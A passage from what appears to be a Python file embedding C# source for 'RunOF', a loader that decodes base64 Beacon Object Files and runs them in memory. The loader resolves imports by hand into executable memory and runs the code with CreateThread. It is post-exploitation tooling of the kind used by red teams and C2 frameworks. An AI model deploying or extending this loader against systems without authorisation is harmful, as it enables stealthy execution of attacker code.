			bool bStdIn = NativeDeclarations.SetStdHandle(STD_INPUT_HANDLE, hStdInPipes);
			if (bStdIn)
			{
#if DEBUG
				Console.WriteLine($"[+] SetStdHandle STDIN to 0x{hStdInPipes.ToInt64():X} ");
			}
			else
			{
				Console.WriteLine($"[-] Unable to SetStdHandle STDIN to 0x{hStdInPipes.ToInt64():X} ");
				return false;
#endif
			}
			return true;
		}

	}
}
"""

IAT_CS = """
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace RunOF.Internals
{
	class IAT
	{
		private readonly IntPtr iat_addr;
		private int iat_pages;
		private int iat_count;
		private readonly Dictionary<String, IntPtr> iat_entries;
		public IAT()
		{
			this.iat_pages = 2;
			this.iat_addr = NativeDeclarations.VirtualAlloc(IntPtr.Zero, (uint)(this.iat_pages * Environment.SystemPageSize), NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
			this.iat_count = 0;
			this.iat_entries = new Dictionary<string, IntPtr>();
		}
		public IntPtr Resolve(string dll_name, string func_name)
		{
			// do we already have it in our IAT table? It not lookup and add
			if (!this.iat_entries.ContainsKey(dll_name + "$" + func_name))
			{
				//Logger.Debug($"Resolving {func_name} from {dll_name}");

				IntPtr dll_handle = NativeDeclarations.LoadLibrary(dll_name);
				IntPtr func_ptr = NativeDeclarations.GetProcAddress(dll_handle, func_name);
				if (func_ptr == null || func_ptr.ToInt64() == 0)
				{
					throw new Exception($"Unable to resolve {func_name} from {dll_name}");
				}
				//Logger.Debug($"\tGot function address {func_ptr.ToInt64():X}");
				Add(dll_name, func_name, func_ptr);
			}

			return this.iat_entries[dll_name + "$" + func_name];

		}

		// This can also be called directly for functions where you already know the address (e.g. helper functions)
		public IntPtr Add(string dll_name, string func_name, IntPtr func_address)
		{
#if _I386
			//Logger.Debug($"Adding {dll_name+ "$" + func_name} at address {func_address.ToInt64():X} to IAT address {this.iat_addr.ToInt64() + (this.iat_count * 4):X}");

			if (this.iat_count * 4 > (this.iat_pages * Environment.SystemPageSize))
			{
				throw new Exception("Run out of space for IAT entries!");
			}
			Marshal.WriteInt32(this.iat_addr + (this.iat_count * 4), func_address.ToInt32());
			this.iat_entries.Add(dll_name + "$" + func_name, this.iat_addr + (this.iat_count * 4));
			this.iat_count++;

			return this.iat_entries[dll_name + "$" + func_name]; 


#elif _AMD64
			//Logger.Debug($"Adding {dll_name + "$" + func_name} at address {func_address.ToInt64():X} to IAT address {this.iat_addr.ToInt64() + (this.iat_count * 8):X}");


			// check we have space in our IAT table
			if (this.iat_count * 8 > (this.iat_pages * Environment.SystemPageSize))
			{
				throw new Exception("Run out of space for IAT entries!");
			}

			Marshal.WriteInt64(this.iat_addr + (this.iat_count * 8), func_address.ToInt64());
			this.iat_entries.Add(dll_name + "$" + func_name, this.iat_addr + (this.iat_count * 8));
			this.iat_count++;
			return this.iat_entries[dll_name + "$" + func_name]; 


#endif


		}

		public void Update(string dll_name, string func_name, IntPtr func_address)
		{
			if (!this.iat_entries.ContainsKey(dll_name + "$" + func_name)) throw new Exception($"Unable to update IAT entry for {dll_name + "$" + func_name} as don't have an existing entry for it");

#if _I386       
			Marshal.WriteInt32(this.iat_entries[dll_name + "$" + func_name], func_address.ToInt32());
#elif _AMD64
			Marshal.WriteInt64(this.iat_entries[dll_name + "$" + func_name], func_address.ToInt64());
#endif
		}

		internal void Clear()
		{
			NativeDeclarations.ZeroMemory(this.iat_addr, this.iat_pages * Environment.SystemPageSize);

			NativeDeclarations.VirtualFree(this.iat_addr, 0, NativeDeclarations.MEM_RELEASE);


		}
	}
}
"""

IMAGEPARTS_CS = """
using System;
using System.Runtime.InteropServices;

namespace RunOF
{
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct IMAGE_FILE_HEADER
	{
		public IMAGE_FILE_MACHINE Machine;
		public UInt16 NumberOfSections;
		public UInt32 TimeDateStamp;
		public UInt32 PointerToSymbolTable;
		public UInt32 NumberOfSymbols;
		public UInt16 SizeOfOptionalHeader;
		public UInt16 Characteristics;
	}
	public enum IMAGE_FILE_MACHINE : ushort
	{
		IMAGE_FILE_MACHINE_UNKNOWN = 0x0,
		IMAGE_FILE_MACHINE_I386 = 0x14c,
		IMAGE_FILE_MACHINE_AMD64 = 0x8664,
	}


	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct IMAGE_SECTION_HEADER
	{
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
		public byte[] Name;
		public UInt32 PhysicalAddressVirtualSize;
		public UInt32 VirtualAddress;
		public UInt32 SizeOfRawData;
		public UInt32 PointerToRawData;
		public UInt32 PointerToRelocations;
		public UInt32 PointerToLinenumbers;
		public UInt16 NumberOfRelocations;
		public UInt16 NumberOfLinenumbers;
		public UInt32 Characteristics;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct IMAGE_SYMBOL
	{
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
		public byte[] Name;
		public UInt32 Value;
		public IMAGE_SECTION_NUMBER SectionNumber;
		public IMAGE_SYMBOL_TYPE Type;
		public byte StorageClass;
		public byte NumberofAuxSymbols;
	}


	public enum IMAGE_SECTION_NUMBER : short
	{
		IMAGE_SYM_UNDEFINED = 0,
		IMAGE_SYM_ABSOLUTE = -1,
		IMAGE_SYM_DEBUG = -2,
	}

	public enum IMAGE_SYMBOL_TYPE : ushort
	{
		IMAGE_SYM_TYPE_NULL = 0x0,
		IMAGE_SYM_TYPE_VOID = 0x1,
		IMAGE_SYM_TYPE_CHAR = 0x2,
		IMAGE_SYM_TYPE_SHORT = 0x3,
		IMAGE_SYM_TYPE_INT = 0x4,
		IMAGE_SYM_TYPE_LONG = 0x5,
		IMAGE_SYM_TYPE_FLOAT = 0x6,
		IMAGE_SYM_TYPE_DOUBLE = 0x7,
		IMAGE_SYM_TYPE_STRUCT = 0x8,
		IMAGE_SYM_TYPE_UNION = 0x9,
		IMAGE_SYM_TYPE_ENUM = 0xA,
		IMAGE_SYM_TYPE_MOE = 0xB,
		IMAGE_SYM_TYPE_BYTE = 0xC,
		IMAGE_SYM_TYPE_WORD = 0xD,
		IMAGE_SYM_TYPE_UINT = 0xE,
		IMAGE_SYM_TYPE_DWORD = 0xF,
		IMAGE_SYM_TYPE_FUNC = 0x20, // A special MS extra
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct IMAGE_RELOCATION
	{
		public UInt32 VirtualAddress;
		public UInt32 SymbolTableIndex;
		public IMAGE_RELOCATION_TYPE Type; // TODO this is architecture dependant

	}   

	public enum IMAGE_RELOCATION_TYPE : ushort
	{
		// Why does Microsoft list these in decimal for I386 and hex for AMD64?
#if _I386
		/* I386 relocation types */
		IMAGE_REL_I386_ABSOLUTE = 0,
		IMAGE_REL_I386_DIR16 = 1,
		IMAGE_REL_I386_REL16 = 2,
		IMAGE_REL_I386_DIR32 = 6,
		IMAGE_REL_I386_DIR32NB = 7,
		IMAGE_REL_I386_SEG12 = 9,
		IMAGE_REL_I386_SECTION = 10,
		IMAGE_REL_I386_SECREL = 11,
		IMAGE_REL_I386_TOKEN = 12,
		IMAGE_REL_I386_SECREL7 = 13,
		IMAGE_REL_I386_REL32 = 20,
#elif _AMD64

		/* AMD64 relocation types */
		  IMAGE_REL_AMD64_ABSOLUTE = 0x0000,
		  IMAGE_REL_AMD64_ADDR64 = 0x0001,
		  IMAGE_REL_AMD64_ADDR32 = 0x0002,
		  IMAGE_REL_AMD64_ADDR32NB = 0x0003,
		  IMAGE_REL_AMD64_REL32 = 0x0004,
		  IMAGE_REL_AMD64_REL32_1 = 0x0005,
		  IMAGE_REL_AMD64_REL32_2 = 0x0006,
		  IMAGE_REL_AMD64_REL32_3 = 0x0007,
		  IMAGE_REL_AMD64_REL32_4 = 0x0008,
		  IMAGE_REL_AMD64_REL32_5 = 0x0009,
		  IMAGE_REL_AMD64_SECTION = 0x000A,
		  IMAGE_REL_AMD64_SECREL = 0x000B,
		  IMAGE_REL_AMD64_SECREL7 = 0x000C,
		  IMAGE_REL_AMD64_TOKEN = 0x000D,
		  IMAGE_REL_AMD64_SREL32 = 0x000E,
		  IMAGE_REL_AMD64_PAIR = 0x000F,
		  IMAGE_REL_AMD64_SSPAN32 = 0x0010,
#endif

	}


}
"""

NATIVEDECLARATIONS_CS = """
using Microsoft.Win32.SafeHandles;
using System;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;

namespace RunOF.Internals
{
	unsafe class NativeDeclarations
	{


			internal const uint MEM_COMMIT = 0x1000;
			internal const uint MEM_RESERVE = 0x2000;
			internal const uint MEM_RELEASE = 0x00008000;



		internal const uint PAGE_EXECUTE_READWRITE = 0x40;
		internal const uint PAGE_READWRITE = 0x04;
		internal const uint PAGE_EXECUTE_READ = 0x20;
		internal const uint PAGE_EXECUTE = 0x10;
		internal const uint PAGE_EXECUTE_WRITECOPY = 0x80;
		internal const uint PAGE_NOACCESS = 0x01;
		internal const uint PAGE_READONLY = 0x02;
		internal const uint PAGE_WRITECOPY = 0x08;

		internal const uint IMAGE_SCN_MEM_EXECUTE = 0x20000000;
		internal const uint IMAGE_SCN_MEM_READ = 0x40000000;
		internal const uint IMAGE_SCN_MEM_WRITE = 0x80000000;


		[StructLayout(LayoutKind.Sequential)]
			public unsafe struct IMAGE_BASE_RELOCATION
			{
				public uint VirtualAdress;
				public uint SizeOfBlock;
			}

			[DllImport("kernel32.dll")]
			[return: MarshalAs(UnmanagedType.Bool)]
			public static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);

			[DllImport("kernel32.dll", SetLastError = true)]
			public static extern IntPtr GetStdHandle(int nStdHandle);

			[StructLayout(LayoutKind.Sequential)]
			public struct SECURITY_ATTRIBUTES
			{
				public int nLength;
				public unsafe byte* lpSecurityDescriptor;
				public int bInheritHandle;
			}

			[DllImport("kernel32.dll", SetLastError = true)]
			public static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer,
				uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

			[DllImport("kernel32.dll")]
			public static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe,
				ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);

			[DllImport("ntdll.dll", SetLastError = true)]
			public static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, IntPtr processInformation, uint processInformationLength, IntPtr returnLength);

			[DllImport("kernel32")]
			public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);
	   
			[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
			internal static extern bool VirtualFree(IntPtr pAddress, uint size, uint freeType);
		[DllImport("kernel32.dll")]
		public static extern bool HeapFree(IntPtr hHeap, uint dwFlags, IntPtr lpMem);

		[DllImport("kernel32")]
			public static extern IntPtr GetProcessHeap();

			[DllImport("kernel32")]
			public static extern IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, uint dwBytes);

			[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
			public static extern IntPtr LoadLibrary(string lpFileName);

			[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
			public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

			[DllImport("kernel32.dll", SetLastError = true)]
			public static extern IntPtr GetCurrentProcess();

			[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
			public static extern IntPtr GetCommandLine();

			[DllImport("kernel32.dll", SetLastError = true)]
			[ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
			[SuppressUnmanagedCodeSecurity]
			[return: MarshalAs(UnmanagedType.Bool)]
			public static extern bool CloseHandle(IntPtr hObject);

			[DllImport("kernel32")]
			public static extern IntPtr CreateThread(

			  IntPtr lpThreadAttributes,
			  uint dwStackSize,
			  IntPtr lpStartAddress,
			  IntPtr param,
			  uint dwCreationFlags,
			  IntPtr lpThreadId
			  );

			[DllImport("kernel32.dll")]
			public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

			// Argument parsing!!!!
			[DllImport("shell32.dll", SetLastError = true)]
			static extern IntPtr CommandLineToArgvW([MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs);

			[DllImport("kernel32.dll", SetLastError = true)]
			static extern IntPtr LocalFree(IntPtr hMem);

			[DllImport("kernel32.dll")]
			public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

			[DllImport("kernel32.dll")]
			public static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

			[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
			public static extern IntPtr GetModuleHandle(string lpModuleName);

			[DllImport("kernel32")]
			public static extern uint WaitForSingleObject(

			  IntPtr hHandle,
			  uint dwMilliseconds
			  );



			[DllImport("kernel32.dll")]
			public static extern bool GetExitCodeThread(IntPtr hThread, out int lpExitcode);


		[DllImport("Kernel32.dll", EntryPoint = "RtlZeroMemory", SetLastError = false)]
		public static extern void ZeroMemory(IntPtr dest, int size);




		[StructLayout(LayoutKind.Sequential)]
			public struct PROCESS_BASIC_INFORMATION
			{
				public uint ExitStatus;
				public IntPtr PebAddress;
				public UIntPtr AffinityMask;
				public int BasePriority;
				public UIntPtr UniqueProcessId;
				public UIntPtr InheritedFromUniqueProcessId;
			}

			[StructLayout(LayoutKind.Sequential)]
			public struct UNICODE_STRING : IDisposable
			{
				public ushort Length;
				public ushort MaximumLength;
				private IntPtr buffer;

				public UNICODE_STRING(string s)
				{
					Length = (ushort)(s.Length * 2);
					MaximumLength = (ushort)(Length + 2);
					buffer = Marshal.StringToHGlobalUni(s);
				}

				public void Dispose()
				{
					Marshal.FreeHGlobal(buffer);
					buffer = IntPtr.Zero;
				}

				public override string ToString()
				{
					return Marshal.PtrToStringUni(buffer);
				}

			}

			public enum AllocationProtectEnum : uint
			{
				PAGE_EXECUTE = 0x00000010,
				PAGE_EXECUTE_READ = 0x00000020,
				PAGE_EXECUTE_READWRITE = 0x00000040,
				PAGE_EXECUTE_WRITECOPY = 0x00000080,
				PAGE_NOACCESS = 0x00000001,
				PAGE_READONLY = 0x00000002,
				PAGE_READWRITE = 0x00000004,
				PAGE_WRITECOPY = 0x00000008,
				PAGE_GUARD = 0x00000100,
				PAGE_NOCACHE = 0x00000200,
				PAGE_WRITECOMBINE = 0x00000400
			}

			public enum HeapAllocFlags : uint
			{
			HEAP_GENERATE_EXCEPTIONS = 0x00000004,
			HEAP_NO_SERIALIZE = 0x00000001,
			HEAP_ZERO_MEMORY = 0x00000008,

			}

		public enum WaitEventEnum : uint
		{
			WAIT_ABANDONED = 0x00000080,
			WAIT_OBJECT_0 = 00000000,
			WAIT_TIMEOUT  = 00000102,
			WAIT_FAILED = 0xFFFFFFFF,
		}

			public enum StateEnum : uint
			{
				MEM_COMMIT = 0x1000,
				MEM_FREE = 0x10000,
				MEM_RESERVE = 0x2000
			}

			public enum TypeEnum : uint
			{
				MEM_IMAGE = 0x1000000,
				MEM_MAPPED = 0x40000,
				MEM_PRIVATE = 0x20000
			}

			public struct MEMORY_BASIC_INFORMATION
			{
				public IntPtr BaseAddress;
				public IntPtr AllocationBase;
				public AllocationProtectEnum AllocationProtect;
				public IntPtr RegionSize;
				public StateEnum State;
				public AllocationProtectEnum Protect;
				public TypeEnum Type;
			}
		}



	}
"""

PARSEDARGS_CS = """
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Globalization;
using System.Linq;
using System.Runtime.Remoting.Messaging;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using static RunOF.Program;

namespace RunOF.Internals
{

	class ParsedArgs
	{
		internal string filename;
		internal byte[] file_bytes;
		internal int thread_timeout = 30000;
		internal string entry_name = "go";
		private const int ERROR_INVALID_COMMAND_LINE = 0x667;
		internal List<OfArg> of_args;
		public bool debug = false;
		//private string b64;
		private string[] parts;
		public ParsedArgs(string[] parts)
		{

			Log($"Parsing {parts.Length} Arguments: {string.Join(" ", parts)}");
			of_args = new List<OfArg>();


			// Set our thread timeout (seconds).
			// This can be a number, or -1
			if (parts.Contains("-t"))
			{
				try
				{
					int t = int.Parse(ExtractArg(parts, "-t"));
					if (t >= 0)
					{
						this.thread_timeout = t * 1000;
					}
					else if (t == -1)
					{
						this.thread_timeout = -1;
					}
					else
					{
						Log("Timeout cannot be less than -1, ignoring");
					}

				}
				catch (Exception e)
				{
					throw new ArgumentException("Unable to handle timeout argument \\n {e}");
				}
			}

			if (parts.Contains("-e"))
			{
				try
				{
					this.entry_name = ExtractArg(parts, "-e");

				}
				catch (Exception e)
				{
					//PrintUsage();
					throw new ArgumentException($"Unable to handle entry point argument \\n {e}");
				}
			}

			// Now read in any optional arguments that get provided to the OF. 

			// -------- optional OF args --------
			for (int i = 0; i < parts.Length; i++)
			{
				string arg = parts[i];

				// -b (base64 -> bytes)
				if (arg.StartsWith("-b", StringComparison.Ordinal))
				{
					string val = ValueAfter(arg, parts, ref i);
					if (val != null)
					{
						try { of_args.Add(new OfArg(Convert.FromBase64String(val))); }
						catch (Exception e) { Log("Unable to parse OF argument -b as a base64 array: " + e); }
					}
					continue;
				}

				// -i (uint32)
				/*if (arg.StartsWith("-i", StringComparison.Ordinal))
				{
					string val = ValueAfter(arg, parts, ref i);
					if (val != null)
					{
						try { of_args.Add(new OfArg(UInt32.Parse(val))); }
						catch (Exception e) { Log("Unable to parse OF argument -i as a uint32: " + e); }
					}
					continue;
				}*/

				/*if (arg.StartsWith("-i", StringComparison.Ordinal))
				{
    				Log("[-i] token at index " + i + " arg='" + arg + "'");
    				string val = ValueAfter(arg, parts, ref i);
    				if (val != null)
    				{
        				Log("[-i] value='" + val + "' (post-ValueAfter index=" + i + ")");
        				try
        				{
            				of_args.Add(new OfArg(UInt32.Parse(val)));
            				Log("[-i] parsed OK: " + val);
        				}
        				catch (Exception e)
        				{
            				Log("[-i] parse error for value '" + val + "' at index " + i + ": " + e);
        				}
    				}
    				else
    				{
        				Log("[-i] missing value (post-ValueAfter index=" + i + ")");
    				}
    				continue;
				}*/

				if (arg.StartsWith("-i", StringComparison.Ordinal))
				{
    				Log("[-i] token at index " + i + " arg='" + arg + "'");

    				string val = null;

    				// Prefer inline form: -i:<value>
    				int colon = arg.IndexOf(':');
    				if (colon >= 0)
    				{
        				string inline = arg.Substring(colon + 1);
        				int cut = inline.IndexOfAny(new[] { ' ', '\\t', '\\r', '\\n', ';' });
        				if (cut >= 0) inline = inline.Substring(0, cut);
        				inline = inline.Trim().Trim('\\'', '"');
        				val = inline;
        				Log("[-i] inline value='" + val + "'");
    				}
    				else
    				{
        				// Fallback to next token
        				string v = ValueAfter(arg, parts, ref i);
        				if (v != null)
        				{
            				int cut = v.IndexOfAny(new[] { ' ', '\\t', '\\r', '\\n', ';' });
            				if (cut >= 0) v = v.Substring(0, cut);
            				v = v.Trim().Trim('\\'', '"');
            				val = v;
            				Log("[-i] next-token value='" + val + "' (post-ValueAfter index=" + i + ")");
        				}
    				}

    				if (!string.IsNullOrEmpty(val))
    				{
        				try
        				{
            				of_args.Add(new OfArg(UInt32.Parse(val)));
            				Log("[-i] parsed OK: " + val);
        				}
        				catch (Exception e)
        				{
            				Log("[-i] parse error for value '" + val + "' at index " + i + ": " + e);
        				}
   					}
    				else
    				{
        				Log("[-i] missing/empty value (index=" + i + ")");
    				}

    				continue;
				}

				// -s (uint16)
				if (arg.StartsWith("-s", StringComparison.Ordinal))
				{
					string val = ValueAfter(arg, parts, ref i);
					if (val != null)
					{
						try { of_args.Add(new OfArg(UInt16.Parse(val))); }
						catch (Exception e) { Log("Unable to parse OF argument -s as a uint16: " + e); }
					}
					continue;
				}

				// -z (ASCII string, NUL-terminated)
				if (arg.StartsWith("-z", StringComparison.Ordinal))
				{
					string val = ValueAfter(arg, parts, ref i);
					if (string.IsNullOrEmpty(val))
					{
						Log("[-z] missing value; skipping");
					}
					else
					{
						string real = Regex.Replace(val, "Write-Output", "", RegexOptions.IgnoreCase);
						string cleaned = KeepPrintableAscii(SanitizeArg(TrimOuterQuotes(real)));
						// ASCII + single NUL
						/*var bytes = Encoding.ASCII.GetBytes(cleaned);
						var withNull = new byte[bytes.Length + 1];
						Buffer.BlockCopy(bytes, 0, withNull, 0, bytes.Length);
						withNull[withNull.Length - 1] = 0;*/

						of_args.Add(new OfArg(cleaned));
						Log("[-z] added \\"" + cleaned + "\\" (len=" + cleaned.Length + ")");
					}
					continue;
				}

				// -Z (UTF-16LE string, NUL-terminated)
				if (arg.StartsWith("-Z", StringComparison.Ordinal))
				{
					string val = ValueAfter(arg, parts, ref i);
					if (val != null)
					{
						//val = TrimOuterQuotes(val);
						// Add one UTF-16 NUL (two zero bytes)
						/*var bytes = Encoding.Unicode.GetBytes(val + "\\0");
						of_args.Add(new OfArg(bytes));*/

						string real = Regex.Replace(val, "Write-Output", "", RegexOptions.IgnoreCase);
						string cleaned = KeepPrintableAscii(SanitizeArg(TrimOuterQuotes(real)));
						of_args.Add(OfArg.FromWString(cleaned));
					}
					continue;
				}
			}

			try
			{
				this.parts = parts;
				Log("Initalized this.parts variable");

				// Find the token after 'bofexec'
				var b64 = parts
					.SkipWhile(p => !p.Equals("bofexec", StringComparison.OrdinalIgnoreCase))
					.Skip(1)
					.FirstOrDefault();

				Log($"Got base64 encoded BOF: {b64}");

				if (string.IsNullOrWhiteSpace(b64) || !Regex.IsMatch(b64, @"^[A-Za-z0-9+/]+={0,2}$"))
					throw new FormatException("Missing or invalid BOF base64.");


				//string b64 = parts[1];
				Log($"Decoding BOF base64 {b64}");
				file_bytes = Convert.FromBase64String(b64);
			}
			catch (Exception e)
			{
				Log($"Hit exception in Parsing Args {e}");
			}
		}

		public byte[] SerialiseArgs()
		{
			List<byte> output_bytes = new List<byte>();
			Log($"Serialising {this.of_args.Count} object file arguments ");
			// convert our list of arguments into a byte array
			foreach (var of_arg in this.of_args)
			{
				Log($"\\tSerialising arg of type {of_arg.arg_type} [{(uint)of_arg.arg_type}:X]");
				// Add the type
				output_bytes.AddRange(BitConverter.GetBytes((uint)of_arg.arg_type));
				// Add the length
				output_bytes.AddRange(BitConverter.GetBytes((uint)of_arg.arg_data.Count<byte>()));
				// Add the data
				output_bytes.AddRange(of_arg.arg_data);
			}
			return output_bytes.ToArray();
			
		}

		/*public byte[] SerialiseArgs()
		{
			var sw = Stopwatch.StartNew();
			Log("[Args] SerialiseArgs ENTER");

			try
			{
				if (this.of_args == null)
				{
					Log("[Args] this.of_args == null → returning empty buffer");
					return Array.Empty<byte>();
				}

				Log("[Args] Count=" + this.of_args.Count);
				Log("[Args] Args=" + this.of_args);

				var output = new List<byte>();
				int idx = 0;

				foreach (var of_arg in this.of_args)
				{
					if (of_arg == null)
					{
						Log("[Args][" + idx + "] WARNING: arg is null → skipping");
						idx++;
						continue;
					}

					uint typeU32 = (uint)of_arg.arg_type;

					// Normalize data to a byte[]
					byte[] data;
					if (of_arg.arg_data == null)
					{
						data = Array.Empty<byte>();
					}
					else
					{
						// Try to avoid allocations when possible
						var asArray = of_arg.arg_data as byte[];
						if (asArray != null)
						{
							data = asArray;
						}
						else
						{
							data = of_arg.arg_data.ToArray(); // IEnumerable<byte> → byte[]
						}
					}

					int dataLen = data.Length;

					Log("[Args][" + idx + "] Type=" + of_arg.arg_type + " (0x" + typeU32.ToString("X8") + ")  DataLen=" + dataLen + " bytes");
					Log("[Args][" + idx + "] Data preview: " + HexPreview(data, 32));

					// Build little-endian headers explicitly
					byte[] typeBytes = BitConverter.GetBytes(typeU32);
					byte[] lenBytes = BitConverter.GetBytes((uint)dataLen);
					if (!BitConverter.IsLittleEndian)
					{
						Array.Reverse(typeBytes);
						Array.Reverse(lenBytes);
					}

					output.AddRange(typeBytes);
					output.AddRange(lenBytes);
					output.AddRange(data);

					Log("[Args][" + idx + "] Wrote type(4) + len(4) + data(" + dataLen + ") → total so far " + output.Count + " bytes");
					idx++;
				}

				byte[] result = output.ToArray();
				sw.Stop();
				Log("[Args] SerialiseArgs EXIT  size=" + result.Length + " bytes  elapsed=" + sw.ElapsedMilliseconds + "ms");
				return result;
			}
			catch (Exception ex)
			{
				sw.Stop();
				Log("[Args] SerialiseArgs EXCEPTION " + ex.GetType().Name + ": " + ex.Message + "\n" + ex);
				throw;
			}
		}*/

		/*public byte[] SerialiseArgs()
		{
			List<byte> output_bytes = new List<byte>();
			Log($"Serialising {this.of_args.Count} object file arguments ");
			// convert our list of arguments into a byte array
			foreach (var of_arg in this.of_args)
			{
				Log($"\\tSerialising arg of type {of_arg.arg_type} [{(UInt32)of_arg.arg_type}:X]");
				// Add the type
				output_bytes.AddRange(BitConverter.GetBytes((UInt32)of_arg.arg_type));
				// Add the length
				output_bytes.AddRange(BitConverter.GetBytes((UInt32)of_arg.arg_data.Count()));
				// Add the data
				output_bytes.AddRange(of_arg.arg_data);
			}
			return output_bytes.ToArray();

		}*/

		/*public byte[] SerialiseArgs()
		{
			var output = new List<byte>();
			Log($"[Args] Serialising {this.of_args?.Count ?? 0} object file arguments");

			if (this.of_args == null || this.of_args.Count == 0)
				return Array.Empty<byte>();

			int idx = 0;
			foreach (var of_arg in this.of_args)
			{
				if (of_arg == null)
				{
					Log($"[Args][{idx}] WARNING: null arg skipped");
					idx++; continue;
				}

				var data = of_arg.arg_data as byte[] ?? of_arg.arg_data?.ToArray() ?? Array.Empty<byte>();

				if (IsAsciiZStringType(of_arg.arg_type))
				{
					data = CleanAsciiZ(data);
				}
				else if (IsUtf16ZStringType(of_arg.arg_type))
				{
					data = CleanUtf16Z(data);
				}

				// 3) Validate after cleaning (bounds/surprises)
				ValidateForType(of_arg.arg_type, data);

				// 4) Write type, len, data (little-endian)
				uint typeU32 = (uint)of_arg.arg_type;
				uint lenU32 = (uint)data.Length;

				output.AddRange(BitConverter.GetBytes(typeU32));
				output.AddRange(BitConverter.GetBytes(lenU32));
				output.AddRange(data);

				Log($"[Args][{idx}] type=0x{typeU32:X8} len={lenU32} total={output.Count}");
				idx++;
			}

			return output.ToArray();
		}*/

		static bool IsAsciiZStringType(object argType)
		{
			var name = argType != null ? argType.ToString() : "";
			return string.Equals(name, "ARG_STR", StringComparison.OrdinalIgnoreCase) ||
				   string.Equals(name, "ARG_PATH", StringComparison.OrdinalIgnoreCase);
		}

		static bool IsUtf16ZStringType(object argType)
		{
			var name = argType != null ? argType.ToString() : "";
			return string.Equals(name, "ARG_WSTR", StringComparison.OrdinalIgnoreCase);
		}

		static byte[] CleanAsciiZ(byte[] data)
		{
			if (data == null) return new byte[] { 0x00 };

			// Strip UTF-8 BOM if present
			if (data.Length >= 3 && data[0] == 0xEF && data[1] == 0xBB && data[2] == 0xBF)
			{
				var tmp = new byte[data.Length - 3];
				Buffer.BlockCopy(data, 3, tmp, 0, tmp.Length);
				data = tmp;
			}

			var bytes = new List<byte>(data.Length + 1);
			for (int i = 0; i < data.Length; i++)
			{
				byte b = data[i];

				// drop CR (0x0D); keep LF (0x0A) or change to space if you prefer
				if (b == 0x0D) continue;

				// replace control chars (except TAB/LF) with space
				if (b < 0x20 && b != 0x09 && b != 0x0A) b = (byte)' ';

				// drop embedded NULs
				if (b == 0x00) continue;

				// clamp to printable ASCII
				if (b > 0x7E) b = (byte)'?';

				bytes.Add(b);
			}

			// ensure single trailing NUL
			if (bytes.Count == 0 || bytes[bytes.Count - 1] != 0x00)
				bytes.Add(0x00);

			return bytes.ToArray();
		}

		static byte[] CleanUtf16Z(byte[] data)
		{
			if (data == null) return new byte[] { 0x00, 0x00 };

			// Strip UTF-16LE BOM (FF FE)
			if (data.Length >= 2 && data[0] == 0xFF && data[1] == 0xFE)
			{
				var tmp = new byte[data.Length - 2];
				Buffer.BlockCopy(data, 2, tmp, 0, tmp.Length);
				data = tmp;
			}

			string s = Encoding.Unicode.GetString(data);
			s = s.Replace("\\r", string.Empty).Normalize(NormalizationForm.FormC);

			var sb = new StringBuilder(s.Length);
			for (int i = 0; i < s.Length; i++)
			{
				char ch = s[i];
				if (char.IsControl(ch) && ch != '\\t' && ch != '\\n')
					sb.Append(' ');
				else
					sb.Append(ch);
			}

			var bytes = Encoding.Unicode.GetBytes(sb.ToString());
			var outList = new List<byte>(bytes.Length + 2);

			for (int i = 0; i + 1 < bytes.Length; i += 2)
			{
				if (bytes[i] == 0x00 && bytes[i + 1] == 0x00) continue;
				outList.Add(bytes[i]);
				outList.Add(bytes[i + 1]);
			}

			// ensure trailing 2-byte NUL
			int n = outList.Count;
			if (n < 2 || outList[n - 2] != 0x00 || outList[n - 1] != 0x00)
			{
				outList.Add(0x00);
				outList.Add(0x00);
			}

			return outList.ToArray();
		}

		private static string ValueAfter(string arg, string[] parts, ref int i)
		{
			// expect short switches like -b, -i, -s, -z, -Z
			int nameLen = 2;
			if (arg.Length > nameLen && (arg[nameLen] == ':' || arg[nameLen] == '='))
				return arg.Substring(nameLen + 1);

			if (i + 1 < parts.Length && !parts[i + 1].StartsWith("-", StringComparison.Ordinal))
				return parts[++i];

			return null;
		}

		private static string TrimOuterQuotes(string s)
		{
			if (string.IsNullOrEmpty(s)) return s;
			int last = s.Length - 1;
			char a = s[0], b = s[last];
			if ((a == '"' && b == '"') || (a == '\\'' && b == '\\'')) return s.Substring(1, s.Length - 2);
			return s;
		}

		private static string SanitizeArg(string s)
		{
			if (string.IsNullOrEmpty(s)) return string.Empty;
			var sb = new StringBuilder(s.Length);
